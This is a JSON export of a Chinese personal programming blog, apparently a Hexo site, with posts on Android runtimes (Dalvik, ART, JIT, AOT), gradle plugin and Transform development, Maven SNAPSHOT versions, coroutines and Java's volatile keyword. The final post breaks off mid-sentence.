{"meta":{"title":"superxlcr's notebook","subtitle":null,"description":"just a programmer.","author":"superxlcr","url":"https://superxlcr.github.io"},"pages":[{"title":"分类","date":"2018-03-23T16:13:07.000Z","updated":"2020-05-11T07:23:44.912Z","comments":true,"path":"categories/index.html","permalink":"https://superxlcr.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-03-23T16:11:49.000Z","updated":"2020-05-11T07:23:44.913Z","comments":true,"path":"tags/index.html","permalink":"https://superxlcr.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"JIT、AOT、Dalvik、ART概念整理","slug":"JIT、AOT、Dalvik、ART概念整理","date":"2020-08-03T12:37:37.000Z","updated":"2020-08-19T03:34:50.910Z","comments":true,"path":"2020/08/03/JIT、AOT、Dalvik、ART概念整理/","link":"","permalink":"https://superxlcr.github.io/2020/08/03/JIT、AOT、Dalvik、ART概念整理/","excerpt":"","text":"最近整理了Dalvik、ART、JIT、AOT、混合编译等概念，在此写篇博客记录一下 DalvikDalvik是Google公司自己设计用于Android平台的虚拟机 Dalvik虚拟机是Google等厂商合作开发的Android移动设备平台的核心组成部分之一 它可以支持已转换为 .dex格式的Java应用程序的运行，.dex格式是专为Dalvik设计的一种压缩格式，适合内存和处理器速度有限的系统 Dalvik经过优化，允许在有限的内存中同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux 进程执行 独立的进程可以防止在虚拟机崩溃的时候所有程序都被关闭 Dalvik是执行的时候编译+运行，安装比较快，开启应用比较慢，应用占用空间小 ARTART即Android Runtime, ART 的机制与 Dalvik 不同 在Dalvik下，应用每次运行的时候，字节码都需要通过即时编译器（just in time ，JIT）转换为机器码，这会拖慢应用的运行效率 而在ART 环境中，应用在第一次安装的时候，字节码就会预先编译成机器码，使其成为真正的本地应用 这个过程叫做预编译（AOT，Ahead-Of-Time） 这样的话，应用的启动(首次)和执行都会变得更加快速 对比Dalvik，ART是安装的时候就编译好了，执行的时候直接就可以运行的，安装慢，开启应用快，占用空间大 JITJIT，即Just-in-time，动态(即时)编译，边运行边编译 在Android中我们的java代码最终会编译成为dex文件，在4.4以下的版本中由Dalvik虚拟机运行 Dalvik虚拟机可以看做是一个Java VM，他负责解释dex文件为机器码，如果我们不做处理的话，每次执行代码，都需要Dalvik将dex代码翻译为微处理器指令，然后交给系统处理，这样效率不高 为了解决这个问题，Google在2.2版本添加了JIT编译器，当App运行时，每当遇到一个新类，JIT编译器就会对这个类进行编译，经过编译后的代码，会被优化成相当精简的原生型指令码（即native code），这样在下次执行到相同逻辑的时候，速度就会更快 当然使用JIT也不一定加快执行速度，如果大部分代码的执行次数很少，那么编译花费的时间不一定少于执行dex的时间。Google当然也知道这一点，所以JIT不对所有dex代码进行编译，而是只编译执行次数较多的dex为本地机器码 有一点需要注意，那就是dex字节码翻译成本地机器码是发生在应用程序的运行过程中的，并且应用程序每一次重新运行的时候，都要做重做这个翻译工作，所以这个工作并不是一劳永逸，每次重新打开App，都需要JIT编译 另外，Dalvik虚拟机从Android一出生一直活到4.4版本，而JIT在Android刚发布的时候并不存在，在2.2之后才被添加到Dalvik中 AOTAOT是”Ahead Of Time”的缩写，指的就是ART(Anroid RunTime)这种运行方式 前面介绍过，JIT是运行时编译，这样可以对执行次数频繁的dex代码进行编译和优化，减少以后使用时的翻译时间，虽然可以加快Dalvik运行速度，但是还是有弊病，那就是将dex翻译为本地机器码也要占用时间，所以Google在4.4之后推出了ART，用来替换Dalvik 在4.4版本上，两种运行时环境共存，可以相互切换，但是在5.0+，Dalvik虚拟机则被彻底的丢弃，全部采用ART ART的策略与Dalvik不同，在ART 环境中，应用在第一次安装的时候，字节码就会预先编译成机器码，使其成为真正的本地应用。之后打开App的时候，不需要额外的翻译工作，直接使用本地机器码运行，因此运行速度提高 当然ART与Dalvik相比，还是有缺点的 ART需要应用程序在安装时，就把程序代码转换成机器语言，所以这会消耗掉更多的存储空间，但消耗掉空间的增幅通常不会超过应用代码包大小的20% 由于有了一个转码的过程，所以应用安装时间难免会延长 混合编译Android N 引入了一种包含编译、解释和 JIT（Just In Time）的混合运行时，以便在安装时间、内存占用、电池消耗和性能之间获得最好的折衷 Android N 包含了一个混合模式的运行时，应用在安装时不做编译，而是解释字节码，所以可以快速启动。ART 中有一种新的、更快的解释器，通过一种新的 JIT 完成，但是这种 JIT 的信息不是持久化的 取而代之的是，代码在执行期间被分析，分析结果保存起来。然后，当设备空转和充电的时候，ART 会执行针对“热代码”进行的基于分析的编译，其他代码不做编译 为了得到更优的代码，ART 采用了几种技巧包括深度内联 对同一个应用可以编译数次，或者找到变“热”的代码路径或者对已经编译的代码进行新的优化，这取决于分析器在随后的执行中的分析数据 这个步骤仍被简称为 AOT，可以理解为“全时段的编译”（All-Of-the-Time compilation） 这种混合使用 AOT、解释、JIT 的策略的全部优点如下 即使是大应用，安装时间也能缩短到几秒 系统升级能更快地安装，因为不再需要优化这一步 应用的内存占用更小，有些情况下可以降低 50% 改善了性能 更低的电池消耗","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"AndroidStudio和gradle修改缓存文件夹路径","slug":"AndroidStudio和gradle修改缓存文件夹路径","date":"2020-07-16T12:51:36.000Z","updated":"2020-07-28T12:42:04.726Z","comments":true,"path":"2020/07/16/AndroidStudio和gradle修改缓存文件夹路径/","link":"","permalink":"https://superxlcr.github.io/2020/07/16/AndroidStudio和gradle修改缓存文件夹路径/","excerpt":"","text":"本文转载自：http://blog.csdn.net/xx326664162/article/details/52004676 Android Studio的缓存文件默认安装的AndroidStudio会在C:\\Users\\YourName\\ .xxx 缓存一些数据 主要有四个文件夹，分别是 .android：这个文件夹是Android SDK生成的AVD（Android Virtual Device Manager）即模拟器存放路径 .AndroidStudio：配置、插件缓存文件夹、最近打开的项目 .gradle：这其中存储的是本地的gradle全局配置文件 ，但是在每次更新gradle后，这个文件都会增大（可以配置离线gradle） .m2：maven仓库下载的库文件保存在这里，你使用的所有的maven仓库都会先缓存到这里然后再添加到你的项目中进行使用；如果你用的插件越多这个文件夹将会持续增大 这三个文件默认都是在C盘的，如何把它们移动到指定的路径呢？？ 如何配置.android文件夹的修改1、这个文件夹是由Android SDK配置模拟器生成的，也是最占空间的一个。 首先，需要添加一个系统的环境变量ANDROID_SDK_HOME，如下图： 变量名其实有些误导人，这个如果Google官方定义成AVD_HOME可能还好一些，其实应该是模拟器的默认路径。 2、添加好环境变量后到新的路径下修改下相应的.ini文件内的路径信息，然后重启系统生效。 .AndroidStudio文件夹的修改这个文件夹的配置有些不太一样，只能从默认的安装文件中去配置。首先进入你的 AndroidStudio 安装目录中的 Bin 文件夹。 1\\Android\\AndroidStudio\\bin 进入文件：idea.properties ，而后修改如下： 这里是我的修改方式，当然你可以设置到你需要的地方，修改好后如果不想 AndroidStudio 重新更新下载，那么直接把文件夹从原来的地方剪切到你设置的地方去吧。 测试发现，虽然正确修改idea.properties文件，并且移动文件夹到新路径，但是在C盘还是会出现.AndroidStudio文件夹，但是Android Studio使用的却是新路径的文件夹。我使用的是AndroidStudio2.1.2 .gradle文件夹的修改这个文件夹直接进入 AndroidStudio &gt; File &gt; Settings 我使用这个方法可行，但是我参考的这篇文章却说这个方法不行，如果你使用这个方法也不行，可以参考这里 测试发现，虽然正确配置路径，并且移动文件夹到新路径，但是在C盘还是会出现.gradle文件夹，但是Android Studio使用的却是新路径的文件夹。我使用的是AndroidStudio2.1.2 .m2文件夹的修改1、这个的配置也相对简单，同样在设置中进行更改： 2、修改好后如果不想 AndroidStudio 重新更新下载，那么直接把.m2文件夹从原来的地方剪切到你设置的地方。 参考文章：http://blog.csdn.net/qiujuer/article/details/44160127http://blog.csdn.net/qiujuer/article/details/44257993http://www.jianshu.com/p/7a58c5f154c5","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"gradle插件编写（三）","slug":"gradle插件编写（三）","date":"2020-07-16T11:56:12.000Z","updated":"2020-07-16T12:23:24.180Z","comments":true,"path":"2020/07/16/gradle插件编写（三）/","link":"","permalink":"https://superxlcr.github.io/2020/07/16/gradle插件编写（三）/","excerpt":"","text":"上一篇博客可见：gradle插件编写（二） 博主最近有在编写gradle相关的插件，总结了一些新的相关问题，在此记录一下 如何查看Android官方gradle插件源码当我们在编写gradle插件时，偶尔会有需要参考或者修改官方编译流程的时候这时我们该去哪里查看官方的gradle插件源码呢？ 经过一番查找，博主找到如下记录：https://stackoverflow.com/questions/41379103/source-code-of-googles-gradle-plugin-for-building-android 上文的回答意思是我们可以去gradle的缓存目录中（一般在C盘的用户文件夹下）.gradle/caches/modules-2/files-2.1/com.android.tools.build/gradle-core/我们在该文件夹下可以搜索到一个类似于gradle-core-2.3.1-sources.jar的文件（2.3.1表示你使用的gradle插件版本）反编译即可得到源码了 又或者我们可以直接clone别人准备好的gradle源码，方便用于debug编译流程调试https://github.com/zawn/android-gradle-plugin","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"协程","slug":"协程","date":"2020-05-27T12:31:41.000Z","updated":"2020-05-27T12:48:50.469Z","comments":true,"path":"2020/05/27/协程/","link":"","permalink":"https://superxlcr.github.io/2020/05/27/协程/","excerpt":"","text":"本文转载自：https://juejin.im/post/5d5df6b35188252ae10bdf42 什么是协程？今天要讲的这个东西说实话，我也是今天才知道，一个我们大多数人可能从来都没用过的语法，那就是传说中的【协程 Coroutine】。可能你会说，携程谁不知道啊，不就是哪个用来订机票订酒店的软件么，这有什么好学的！这样的话你就错了，此协程非彼携程，可不要傻傻分不清楚喽！ 什么是进程和线程进程是什么直白地讲，进程就是应用程序的启动实例。比如我们运行一个游戏，打开一个软件，就是开启了一个进程，进程拥有代码和打开的文件资源、数据资源、独立的内存空间。 线程又是什么线程从属于进程，是程序的实际执行者。一个进程至少包含一个主线程，也可以有更多的子线程，线程拥有自己的栈空间。线程具有五种状态： 对操作系统来说，线程是最小的执行单元，进程是最小的资源管理单元。 无论进程还是线程，都是由操作系统所管理的。 线程之间是如何进行协作的呢？ 最经典的例子就是生产者/消费者模式： 若干个生产者线程向队列中写入数据，若干个消费者线程从队列中消费数据。 什么是协程官方定义如下： 1A coroutine is a function that can suspend its execution (yield) until the given given YieldInstruction finishes. 用我蹩脚的英语来翻译一下就是： 学过计算机组成原理的都知道，当 CPU 在多个进程间切换时，那些后台程序就会处于这种暂停用英文的 Suspend 或许更恰当）的状态，所以早年的电脑即使用一个 CPU 也可以同时处理多个进程任务，这是一种“伪多线程”的技术。 除此之外比较重要的一点是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程那样需要上下文切换来消耗资源，因此协程的开销远远小于线程的开销。 注意，这里要划一个重点，协程是一种“伪多线程”，始终记得这一点，可以帮助我们来理解协程会这个概念。 协程函数的写法Java 语言并没有对协程提供原生支持，所以用 Java 暂时还演示不了，但是有个开源框架基本模拟除了协程的功能，感兴趣的朋友可以去看看源码。。。 地址 ：https://github.com/kilim/kilim （PS：kotlin新版本已对协程有了支持） Go 语言根据我查询资料来看，对于协程的支持超乎我的想象，可以说是强大而简洁，轻轻松松分分钟创建成百上千个协程并发执行。 12345678910func Add(x, y int) &#123; z := x + y fmt.Println(z)&#125; func main() &#123; for i:=0; i&lt;10; i++ &#123; go Add(i, i) &#125;&#125; 如上代码，在一个函数调用前加上 go 关键字，这次调用就会在一个新的协程中并发执行。当被调用的函数返回时，这个协程也自动结束。需要注意的是，如果这个函数有返回值，那么这个返回值会被丢弃。 Python 语言也可以通过 yield/send 的方式实现协程。在 python 3.5 以后，async/await 成为了更好的替代方案。 12345678910111213def consume(): while True: # consumer 协程等待接收数据 number = yield print(&quot;开始消费&quot;,number) consumer = consume()# 让初始化状态的 consumer 协程先执行起来，在 yield 处停止next(consumer)for num in range(0,100) print(&quot;开始生产&quot;,num) # 发送数据给 consumer 协程 consumer.send(num) 其他语言的写法我也就不写了，毕竟不太熟，写了怕误人子弟！！！ 总结根据今天查阅的资料来看，协程的应用场景主要在于 ：I/O 密集型任务。 这一点与多线程有些类似，但协程调用是在一个线程内进行的，是单线程，切换的开销小，因此效率上略高于多线程。当程序在执行 I/O 时操作时，CPU 是空闲的，此时可以充分利用 CPU 的时间片来处理其他任务。在单线程中，一个函数调用，一般是从函数的第一行代码开始执行，结束于 return 语句、异常或者函数执行（也可以认为是隐式地返回了 None ）。 有了协程，我们在函数的执行过程中，如果遇到了耗时的 I/O 操作，函数可以临时让出控制权，让 CPU 执行其他函数，等 I/O 操作执行完毕以后再收回控制权。 简单来讲协程的好处： 跨平台 跨体系架构 无需线程上下文切换的开销 无需原子操作锁定及同步的开销 方便切换控制流，简化编程模型 高并发+高扩展性+低成本：一个CPU支持上万的协程都不是问题。所以很适合用于高并发处理。 缺点： 无法利用多核资源：协程的本质是个单线程，它不能同时将 单个CPU 的多个核用上，协程需要和进程配合才能运行在多CPU上，当然我们日常所编写的绝大部分应用都没有这个必要，除非是cpu密集型应用。 进行阻塞（Blocking）操作（如IO时）会阻塞掉整个程序：这一点和事件驱动一样，可以使用异步IO操作来解决 最后再贴个图来总结一下，更清楚：","categories":[{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/categories/程序设计/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/tags/程序设计/"}]},{"title":"理解Maven中的SNAPSHOT版本和正式版本","slug":"理解Maven中的SNAPSHOT版本和正式版本","date":"2020-05-26T12:49:08.000Z","updated":"2020-05-26T12:53:08.030Z","comments":true,"path":"2020/05/26/理解Maven中的SNAPSHOT版本和正式版本/","link":"","permalink":"https://superxlcr.github.io/2020/05/26/理解Maven中的SNAPSHOT版本和正式版本/","excerpt":"","text":"本文转载自：https://www.cnblogs.com/huang0925/p/5169624.html Maven中建立的依赖管理方式基本已成为Java语言依赖管理的事实标准，Maven的替代者Gradle也基本沿用了Maven的依赖管理机制。在Maven依赖管理中，唯一标识一个依赖项是由该依赖项的三个属性构成的，分别是groupId、artifactId以及version。这三个属性可以唯一确定一个组件（Jar包或者War包）。 其实在Nexus仓库中，一个仓库一般分为public(Release)仓和SNAPSHOT仓，前者存放正式版本，后者存放快照版本。如果在项目配置文件中（无论是build.gradle还是pom.xml）指定的版本号带有’-SNAPSHOT’后缀，比如版本号为’Junit-4.10-SNAPSHOT’，那么打出的包就是一个快照版本。 快照版本和正式版本的主要区别在于，本地获取这些依赖的机制有所不同。假设你依赖一个库的正式版本，构建的时候构建工具会先在本次仓库中查找是否已经有了这个依赖库，如果没有的话才会去远程仓库中去拉取。所以假设你发布了Junit-4.10.jar到了远程仓库，有一个项目依赖了这个库，它第一次构建的时候会把该库从远程仓库中下载到本地仓库缓存，以后再次构建都不会去访问远程仓库了。所以如果你修改了代码，向远程仓库中发布了新的软件包，但仍然叫Junit-4.10.jar，那么依赖这个库的项目就无法得到最新更新。你只有在重新发布的时候升级版本，比如叫做Junit-4.11.jar，然后通知依赖该库的项目组也修改依赖版本为Junit-4.11,这样才能使用到你最新添加的功能。 这种方式在团队内部开发的时候会变的特别蛋痛。假设有两个小组负责维护两个组件，example-service和example-ui,其中example-ui项目依赖于example-service。而这两个项目每天都会构建多次，如果每次构建你都要升级example-service的版本，那么你会疯掉。这个时候SNAPSHOT版本就派上用场了。每天日常构建时你可以构建example-service的快照版本，比如example-service-1.0-SNAPSHOT.jar，而example-ui依赖该快照版本。每次example-ui构建时，会优先去远程仓库中查看是否有最新的example-service-1.0-SNAPSHOT.jar，如果有则下载下来使用。即使本地仓库中已经有了example-service-1.0-SNAPSHOT.jar，它也会尝试去远程仓库中查看同名的jar是否是最新的。有的人可能会问，这样不就不能充分利用本地仓库的缓存机制了吗？别着急，Maven比我们想象中的要聪明。在配置Maven的Repository的时候中有个配置项，可以配置对于SNAPSHOT版本向远程仓库中查找的频率。频率共有四种，分别是always、daily、interval、never。当本地仓库中存在需要的依赖项目时，always是每次都去远程仓库查看是否有更新，daily是只在第一次的时候查看是否有更新，当天的其它时候则不会查看；interval允许设置一个分钟为单位的间隔时间，在这个间隔时间内只会去远程仓库中查找一次，never是不会去远程仓库中查找（这种就和正式版本的行为一样了）。 Maven版本的配置方式为： 12345678&lt;repository&gt; &lt;id&gt;myRepository&lt;/id&gt; &lt;url&gt;...&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;updatePolicy&gt;XXX&lt;/updatePolicy&gt; &lt;/snapshots&gt;&lt;/repository&gt; 其中updatePolicy就是那4种类型之一。如果配置间隔时间更新，可以写作interval:XX(XX是间隔分钟数)。daily配置是默认值。 而在Gradle，可以设置本地缓存的更新策略。 1234configurations.all &#123; // check for updates every build resolutionStrategy.cacheChangingModulesFor 0,&apos;seconds&apos;&#125; 当然也可以按照分钟或者小时来设置. 123456configurations.all &#123; resolutionStrategy.cacheChangingModulesFor 10, ‘minutes&apos;&#125;configurations.all &#123; resolutionStrategy.cacheChangingModulesFor 4, ‘hours&apos;&#125; 所以一般在开发模式下，我们可以频繁的发布SNAPSHOT版本，以便让其它项目能实时的使用到最新的功能做联调；当版本趋于稳定时，再发布一个正式版本，供正式使用。当然在做正式发布时，也要确保当前项目的依赖项中不包含对任何SNAPSHOT版本的依赖，保证正式版本的稳定性。","categories":[{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/categories/杂项/"}],"tags":[{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"查看gradle各任务依赖关系","slug":"查看gradle各任务依赖关系","date":"2020-05-14T14:28:59.000Z","updated":"2020-05-14T14:32:50.280Z","comments":true,"path":"2020/05/14/查看gradle各任务依赖关系/","link":"","permalink":"https://superxlcr.github.io/2020/05/14/查看gradle各任务依赖关系/","excerpt":"","text":"本文转载自：https://blog.csdn.net/u010389578/article/details/80630964 在gradle中一个任务一般都是由多个子任务组成，各个子任务之间存在依赖关系，gradle会按我们预定的依赖关系去选择合适的顺序去执行各个子任务，最终保证任务的正确执行。在使用gradle构建工程的时候，有时我们需要去看某个任务由哪些子任务组成，各个子任务之间存在着什么样的依赖关系。这时可以选择使用下面的命令去执行需要查看的任务，该命令只会按正确的顺序列出所有的子任务而不会去真正执行 1./gradlew 任务名字 –dry-run（或 -m） 运行./gradlew -h可以看到官方的使用说明 1-m, –dry-run Run the builds with all task actions disabled. 我在最初使用gradle的时候不知道Android中的build、assemble、assembleDebug 、assembleRelease等任务的区别。这时就可以使用上面说到的方法，运行./gradlew build –dry-run，列出所有子任务，可以看到所有子任务都是被跳过的，并不会真正执行。 1234567891011121314:app:preBuild SKIPPED:app:preDebugBuild SKIPPED:app:compileDebugAidl SKIPPED:app:compileDebugRenderscript SKIPPED:app:checkDebugManifest SKIPPED.......................................:app:preReleaseUnitTestBuild SKIPPED:app:javaPreCompileReleaseUnitTest SKIPPED:app:compileReleaseUnitTestJavaWithJavac SKIPPED:app:processReleaseUnitTestJavaRes SKIPPED:app:testReleaseUnitTest SKIPPED:app:test SKIPPED:app:check SKIPPED:app:build SKIPPED 通过对比对列出来的子任务最后发现以下关系： build = assemble + lint + test相关assemble = assembleDebug + assembleRelease","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"gradle插件编写（二）","slug":"gradle插件编写（二）","date":"2020-03-29T04:17:45.000Z","updated":"2020-07-16T12:23:23.239Z","comments":true,"path":"2020/03/29/gradle插件编写（二）/","link":"","permalink":"https://superxlcr.github.io/2020/03/29/gradle插件编写（二）/","excerpt":"","text":"上一篇博客可见：gradle插件编写 博主最近有在编写gradle相关的插件，总结了一些新的相关问题，在此记录一下 Transform执行顺序从1.5.0-beta1开始，Android gradle plugin 加入了 Transform API，允许第三方插件在 class 文件转换成 dex 文件之前来操控 class 文件，这样就很容易在不入侵代码的情况下实现一些 AOP 的操作 这里 Android 官方也实现了很多 transform，这里有一个DesugarTransform，是 Android 给使用了 java8 的代码做脱糖处理的，所以说在 Android 上面使用 java8，其实只是语法糖而已 下图给出了 transform 的工作方式，即上一个 transform 的输出作为下一个 transform 的输入。 既然这样，那么肯定有先后顺序的问题，比如我们自定义了一个 CustomTransfrom，作用是修改某个类中的某些东西，但是官方又实现了一个 ProGuardTransform 用来处理代码混淆，如果是先执行 ProGuardTransform ，后执行 CustomTransfrom ，那么代码先被混淆了，包名类名都变了， CustomTransfrom 肯定不生效了。那么怎么控制这些 transform 的执行顺序呢？ 答案在 com.android.build.gradle.internal.TaskManager#createPostCompilationTasks(VariantScope)，代码太长就不贴了，他会在编译完成之后，准备生成 dex 文件之前 因此Transform执行顺序如下：Desugar -&gt; MergeJavaRes -&gt; apply all the external transforms -&gt; Android studio profiling transforms -&gt; JavaCodeShrinker (Proguard / BuiltInShrinker)-&gt; ResourcesShrinker -&gt; …… 所以，我们大概率不用担心我们自定义的 transform 和 Android 官方提供的 transform 冲突，而在 apply all the external transforms 这一步，就是循环遍历项目中引用的第三方的自定义的 plugin 中的 transform ，先后执行顺序也就提现在 build.gradle 中 apply plugin: xxx 的先后顺序上。谁写在前面，谁就先执行。 buildSrc放置本地插件代码当我们需要应用自定义插件时，尤其在自测阶段，往往需要上传到本地的maven仓库，然后再下载下来应用 除此以外，我们其实还可以在需要应用插件的目标project中，创建名称为buildSrc的module，这样gradle会自动把该module下的代码编译依赖为gradle相关插件的仓库代码 Transform增量编译当我们自定义Transform的时候，一个高效的自定义Transform应该是能支持增量编译的 首先我们需要在返回的配置中支持增量编译： 123public boolean isIncremental() &#123; // 是否支持增量返回 true return true&#125; 改动文件列表对应的接口api如下： 123public interface DirectoryInput extends QualifiedContent &#123; Map&lt;File, Status&gt; getChangedFiles();&#125; 我们可以通过以下代码，获取本次增量编译中改动过的文件： 12345input.directoryInputs.each &#123; directoryInput -&gt; directoryInput.changedFiles.each&#123; changeFileEntry-&gt; def status = changeFileEntry.value; &#125;&#125; 这样我们可以遍历所有改动的文件，而且可以获取每个改动文件的状态，有4种： 123456789public enum Status &#123; NOTCHANGED, ADDED, CHANGED, REMOVED; private Status() &#123; &#125;&#125; JarInput 和DirectoryInput不同，JarInput只能获取状态，也有4种状态： 123public interface JarInput extends QualifiedContent &#123; Status getStatus();&#125; PS：值得注意的是，根据网上查到的一些资料说，删除一个java文件，对应的class文件输入不会出现REMOVED状态，也就是不能从changeFiles里面获取被删除的文件 Transform处理一些非.class文件当我们实现自定义Transform的时候，需要定义该Transform处理的文件类型，一般来说我们要处理的都是class文件，就返回TransformManager.CONTENT_CLASS，如果我们是想要处理资源文件，可以使用TransformManager.CONTENT_RESOURCES，这里按需要来就好 最近博主需要在Transform中处理非.class相关的文件（一些apt生成的非.class的文件，也可理解为资源文件） 比较奇怪的一点是： 在jar包中的资源文件，需要我们定义处理类型为 TransformManager.CONTENT_RESOURCES 才返回 而在我们编译主module下的文件，即在Transform中以dir文件夹输入的资源文件，则是定义处理类型为 TransformManager.CONTENT_CLASS 才返回 因此博主定义的处理文件类型为：TransformManager.CONTENT_JARS，表示class与jar的集合 其中具体的处理逻辑跟处理class文件没有什么特别大的区别，只是获取输出文件的地址时把contentTypes定义为资源类型即可 比较疑惑，在此先记录一下 使用gradle插件的方式在编写完gradle插件后，我们可以通过以下几种方式来应用插件： 1apply from: &apos;xxx.gradle&apos; 上面这种方式用来应用写在.gradle文件的脚本插件 12apply plugin: ClassNameapply plugin:&apos;pluginid&apos; 上面这种方式用来应用继承自Plugin基类的对象插件这类插件可能存放在远程的仓库中，也有可能存放在buildSrc的module下","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"Android常见问题总结（十）","slug":"Android常见问题总结（十）","date":"2020-03-28T14:31:32.000Z","updated":"2020-07-16T11:54:46.890Z","comments":true,"path":"2020/03/28/Android常见问题总结（十）/","link":"","permalink":"https://superxlcr.github.io/2020/03/28/Android常见问题总结（十）/","excerpt":"","text":"上一篇博客传送门：Android常见问题总结（九） Android Studio Build Output输出栏内汉字出现乱码的解决方案最近博主在导入一个Android工程时，遇到了编译后Build Output输出栏乱码的问题，情况大致如下图： 在通过搜索引擎找了一通答案之后，最后的解决方案如下： 打开Configure —&gt; Edit Custom VM Options 添加如下内容后重启Android Studio1-Dfile.encoding=UTF-8 大意就是设置gradle编译jvm的编码是UTF-8，设置完成后重启即可解决问题 Android Studio 正则表达式分组替换信息在Android Studio中，我们可以通过正则表达式来搜索内容举个例子： 1234我们可以通过正则表达式：author:.*来匹配字符串：author: lmr 那么我们该如何实现分组替换功能呢？使用括号与$即可： 12345author:(.*)搭配替换字符串：creator is$1 !!可以把上面匹配的字符串替换为：creator is lmr !! PS：$0 表示的是匹配的整个字符串变量 aar库依赖项打包问题当我们在打包aar时，会发现其实打包进aar里面的代码只有我们源码编译出来的产物（或者是以文件形式依赖的jar库等）我们再gradle中声明的各种依赖并没有打进aar中，那么当我们使用打包出来的aar的时候，为什么不会出现运行错误呢？ 在经过一番搜索后，找到了相关的资料：https://stackoverflow.com/questions/51310920/transitive-aar-dependencies 经过了解，其实aar只会打包自己源码的东西，我们aar所依赖的项都是由maven来进行管理维护的当我们发布aar的时候，会生成相应的pom文件，来描述我们这个aar的属性以及他所需要的依赖的库当我们使用发布的aar的时候，maven以及gradle会根据这个pom文件把相应的依赖给补全，这就是传递依赖的场景 当我们不需要使用传递依赖时，我们在gradle中可以通过exclude方法或者transitive属性来控制： 1234567implementation (xxx) &#123; exclude (group : &quot;xxx&quot;, module : &quot;xxx&quot;)&#125;implementation (xxx) &#123; transitive = false&#125;","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"volatile关键字总结","slug":"volatile关键字总结","date":"2020-03-14T14:00:04.000Z","updated":"2020-05-11T07:23:44.783Z","comments":true,"path":"2020/03/14/volatile关键字总结/","link":"","permalink":"https://superxlcr.github.io/2020/03/14/volatile关键字总结/","excerpt":"","text":"volatile关键字特性volatile关键字有如下三个特性： 可见性 原子性 有序性 可见性是指线程之间的可见性，一个线程修改的状态对另一个线程是可见的也就是一个线程修改的结果，另一个线程马上就能看到在Java中，我们可以通过volatile、synchronized和final实现可见性 原子性原子是世界上的最小单位，具有不可分割的特性volatile能保证对变量单次读/写的原子性比如说，因为long和double两种数据类型的操作可分为高32位和低32位两部分，因此普通的long或double类型读/写可能不是原子的所以，我们可以将共享的long和double变量设置为volatile类型，这样能保证任何情况下对long和double的单次读/写操作都具有原子性 有序性Java 语言提供了volatile和synchronized两个关键字来保证线程之间操作的有序性volatile是因为其本身包含“禁止指令重排序”的语义synchronized 是由“一个变量在同一个时刻只允许一条线程对其进行 lock 操作”这条规则获得的，此规则决定了持有同一个对象锁的两个同步块只能串行执行 volatile原理Java语言提供了一种稍弱的同步机制，即volatile变量，用来确保将变量的更新操作通知到其他线程当把变量声明为volatile类型后，编译器与运行时都会注意到这个变量是共享的，因此不会将该变量上的操作与其他内存操作一起重排序（有序性）volatile变量不会被缓存在寄存器或者对其他处理器不可见的地方，因此在读取volatile类型的变量时总会返回最新写入的值（可见性） 在访问volatile变量时不会执行加锁操作，因此也就不会使执行线程阻塞，因此volatile变量是一种比sychronized关键字更轻量级的同步机制 当对非 volatile 变量进行读写的时候，每个线程先从内存拷贝变量到CPU缓存中如果计算机有多个CPU，每个线程可能在不同的CPU上被处理，这意味着每个线程可以拷贝到不同的 CPU cache 中而声明变量是 volatile 的，JVM 保证了每次读变量都从内存中读，跳过 CPU cache 这一步 ps: volatile 的读性能消耗与普通变量几乎相同，但是写操作稍慢，因为它需要在本地代码中插入许多内存屏障指令来保证处理器不发生乱序执行，不过性能还是比加锁好的 volatile应用volatile比较经典的一个应用场景是在java实现单例模式时，双重校验锁的场景： 12345678910111213141516class Singleton &#123; private volatile static Singleton singleton; private Singleton()&#123;&#125; public static Singleton getInstance()&#123; if(singleton == null)&#123; synchronized(Singleton.class)&#123; if(singleton == null)&#123; singleton = new Singleton(); // 可能出现指令重排序的情况 &#125; &#125; &#125; return singleton; &#125;&#125; 在上面代码注释的那一行，可能会出现指令重排序的问题这里我们先要理解new Singleton()做了什么 new一个对象有如下几个步骤： 看class对象是否加载，如果没有就先加载class对象 分配内存空间，初始化实例 调用构造函数 返回地址给引用 而cpu为了优化程序，可能会进行指令重排序，打乱这3，4这几个步骤，导致实例内存还没分配，就被使用了 因此如果此处的单例变量我们不加上volatile关键字，可能会有如下的场景：用线程A和线程B举例，假设线程A执行到new 